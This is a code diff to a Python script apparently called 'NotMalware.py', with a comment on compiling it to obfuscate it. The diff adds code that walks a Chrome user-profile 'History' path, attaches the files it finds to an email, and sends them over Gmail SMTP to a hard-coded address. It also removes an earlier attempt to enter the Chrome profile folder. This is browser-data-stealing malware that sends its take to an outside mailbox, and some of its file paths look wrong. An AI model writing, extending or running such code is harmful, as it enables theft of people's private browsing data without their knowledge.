@@ -1,3 +1,4 @@
+from email import encoders
 import platform
 import subprocess
 import smtplib
@@ -8,6 +9,11 @@ import os
 import socket
 import getpass
 from email.message import EmailMessage
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.application import MIMEApplication
+
 
 ##To Obfuscate: python3.8 -OO -m py_compile NotMalware.py
 print('hi')
@@ -58,12 +64,8 @@ def main(platform):
         #print (f'{p_status} {p_status}')
 #--------------------------------------------------------------------------------------------
 
-        try:
-            os.chdir(f"%APPDATA%\\Local\\Google\\Chrome\\User Data\\Default")
-            print('e')
-        except:
-            pass
-               
+
+
 
         msg = EmailMessage()
         msg.set_content(message)
@@ -71,6 +73,14 @@ def main(platform):
         msg['Subject'] = info
         msg['From'] = "SVBBZGRy@gmail.com"
         msg['To'] = "SVBBZGRy@gmail.com"
+
+        dir_path = os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default')
+        files = os.listdir(os.path.join("C:", os.sep, 'Users','User','AppData','Roaming','Local','Google','Chrome','User Data','Default','History'))
+        for f in files:  # add files to the message
+            file_path = os.path.join(dir_path, f)
+            attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
+            attachment.add_header('Content-Disposition', 'attachment', filename=f)
+            msg.attach(attachment)
 
         # Send the message via our own SMTP server.
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
